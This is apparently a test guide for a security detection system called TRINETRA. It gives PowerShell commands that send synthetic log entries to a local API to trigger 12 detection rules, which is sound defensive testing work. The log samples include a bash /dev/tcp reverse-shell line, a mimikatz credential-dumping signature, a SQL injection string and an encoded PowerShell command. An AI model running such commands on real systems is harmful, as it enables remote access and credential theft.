# Phase 2 Testing Commands

This document contains curl commands to test each of the 12 detection rules in TRINETRA.

## Prerequisites
- Backend running on http://localhost:8000
- Use PowerShell or curl with proper JSON escaping

---

## Test 1: Brute Force Detection (T1110)
**Trigger**: 5+ failed login attempts in 60 seconds from same IP

```powershell
# Run this 6 times rapidly to trigger brute force alert
1..6 | ForEach-Object {
    Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
        -Method Post `
        -ContentType "application/json" `
        -Body '{
            "source_ip": "5.188.10.23",
            "username": "admin",
            "event_type": "LOGIN_FAILED",
            "severity": 2,
            "raw_log": "sshd[1234]: Failed password for admin from 5.188.10.23 port 22 ssh2",
            "log_format": "linux"
        }'
}
```

**Expected**: Alert with rule "Brute Force Detection", severity 4, MITRE T1110

---

## Test 2: PowerShell Encoded Command (T1059.001)
**Trigger**: PowerShell with encoded command patterns

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "192.168.1.100",
        "event_type": "POWERSHELL",
        "severity": 3,
        "raw_log": "powershell.exe -enc JABjAGwAQQBfAHAAZQBzAHMAIAA9ACAAJABjAGwAQQBfAHAAZQBzAHMAIAA+AA==",
        "log_format": "windows"
    }'
```

**Expected**: Alert with rule "PowerShell Encoded Command", severity 4, MITRE T1059.001

---

## Test 3: Suspicious File Download (T1204)
**Trigger**: File download with executable extensions

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "10.0.0.50",
        "username": "john",
        "event_type": "FILE_DOWNLOAD",
        "severity": 2,
        "raw_log": "User john downloaded suspicious.exe from http://malicious-site.com/payload.exe",
        "log_format": "custom"
    }'
```

**Expected**: Alert with rule "Suspicious File Download", severity 3, MITRE T1204

---

## Test 4: Privilege Escalation (T1068)
**Trigger**: Privilege change keywords

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "192.168.1.55",
        "username": "dev",
        "event_type": "PRIVILEGE_CHANGE",
        "severity": 3,
        "raw_log": "sudo su - root: User dev used sudo to gain root access",
        "log_format": "linux"
    }'
```

**Expected**: Alert with rule "Privilege Escalation Attempt", severity 4, MITRE T1068

---

## Test 5: Credential Dumping (T1003)
**Trigger**: Credential dumping tool signatures

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "10.0.0.45",
        "username": "attacker",
        "event_type": "PROCESS_CREATED",
        "severity": 3,
        "raw_log": "Process mimikatz.exe started - sekurlsa::logonpasswords",
        "log_format": "windows"
    }'
```

**Expected**: Alert with rule "Credential Dumping Indicators", severity 5, MITRE T1003

---

## Test 6: Lateral Movement (T1021)
**Trigger**: SMB/RDP connections from new sources

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "192.168.1.77",
        "dest_ip": "192.168.1.100",
        "event_type": "NETWORK_CONNECTION",
        "severity": 2,
        "raw_log": "SMB connection attempt to \\\\192.168.1.100\\C$ from 192.168.1.77",
        "log_format": "windows"
    }'
```

**Expected**: Alert with rule "Lateral Movement Detected", severity 3, MITRE T1021

---

## Test 7: Data Exfiltration (T1041)
**Trigger**: Large outbound data transfer

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "192.168.1.50",
        "dest_ip": "45.33.32.156",
        "event_type": "NETWORK_CONNECTION",
        "severity": 2,
        "raw_log": "Outbound transfer of 500MB to external IP",
        "log_format": "custom",
        "metadata": {
            "bytes_out": 524288000
        }
    }'
```

**Expected**: Alert with rule "Potential Data Exfiltration", severity 4, MITRE T1041

---

## Test 8: Port Scan (T1046)
**Trigger**: Multiple connections to different ports

```powershell
# Run this 20+ times with different ports to trigger port scan
1..25 | ForEach-Object {
    $port = 1000 + $_
    Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
        -Method Post `
        -ContentType "application/json" `
        -Body "{
            `"source_ip`": `"45.33.23.11`",
            `"event_type`": `"PORT_SCAN`",
            `"severity`": 1,
            `"raw_log`": `"Port scan: TCP probe to port $port from 45.33.23.11`",
            `"log_format`": `"custom`"
        }"
}
```

**Expected**: Alert with rule "Port Scan Detected", severity 3, MITRE T1046

---

## Test 9: SQL Injection (T1190)
**Trigger**: SQL injection patterns in logs

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "203.0.113.50",
        "event_type": "SQL_QUERY",
        "severity": 3,
        "raw_log": "GET /login.php?id=1 UNION SELECT password FROM users-- HTTP/1.1",
        "log_format": "apache"
    }'
```

**Expected**: Alert with rule "SQL Injection Attempt", severity 4, MITRE T1190

---

## Test 10: Reverse Shell (T1059)
**Trigger**: Reverse shell command signatures

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "192.168.1.88",
        "event_type": "PROCESS_CREATED",
        "severity": 4,
        "raw_log": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "log_format": "linux"
    }'
```

**Expected**: Alert with rule "Reverse Shell Signature", severity 5, MITRE T1059

---

## Test 11: Ransomware Activity (T1486)
**Trigger**: Ransomware file patterns

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "10.0.0.25",
        "event_type": "FILE_ACCESS",
        "severity": 4,
        "raw_log": "ransomware detected: .encrypted extension added to 50 files",
        "log_format": "windows"
    }'
```

**Expected**: Alert with rule "Ransomware Activity", severity 5, MITRE T1486

---

## Test 12: Successful Login After Brute Force (T1078)
**Trigger**: Successful login from IP that had failed attempts

```powershell
# First, trigger brute force (same as Test 1)
1..5 | ForEach-Object {
    Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
        -Method Post `
        -ContentType "application/json" `
        -Body '{
            "source_ip": "91.234.56.78",
            "username": "root",
            "event_type": "LOGIN_FAILED",
            "severity": 2,
            "raw_log": "Failed SSH login for root from 91.234.56.78",
            "log_format": "linux"
        }'
}

# Then, successful login from same IP
Start-Sleep -Seconds 2

Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "source_ip": "91.234.56.78",
        "username": "root",
        "event_type": "LOGIN_SUCCESS",
        "severity": 1,
        "raw_log": "Successful SSH login for root from 91.234.56.78",
        "log_format": "linux"
    }'
```

**Expected**: Alert with rule "Successful Login After Brute Force", severity 5, MITRE T1078

---

## Testing Bulk Ingest

```powershell
Invoke-WebRequest -Uri "http://localhost:8000/api/logs/ingest/bulk" `
    -Method Post `
    -ContentType "application/json" `
    -Body '{
        "logs": [
            {"event_type": "LOGIN_FAILED", "raw_log": "Test 1", "source_ip": "1.1.1.1"},
            {"event_type": "LOGIN_SUCCESS", "raw_log": "Test 2", "source_ip": "2.2.2.2"},
            {"event_type": "LOGIN_FAILED", "raw_log": "Test 3", "source_ip": "3.3.3.3"},
            {"event_type": "PORT_SCAN", "raw_log": "Test 4", "source_ip": "4.4.4.4"},
            {"event_type": "POWERSHELL", "raw_log": "Test 5", "source_ip": "5.5.5.5"}
        ]
    }'
```

---

## Verification

After running each test, verify:

1. Check alerts API: `Invoke-WebRequest -Uri "http://localhost:8000/api/alerts" -UseBasicParsing | Select-Object -ExpandProperty Content`

2. Check alert stats: `Invoke-WebRequest -Uri "http://localhost:8000/api/alerts/stats/summary" -UseBasicParsing | Select-Object -ExpandProperty Content`

3. Frontend should show new alerts in real-time at http://localhost:5173/alerts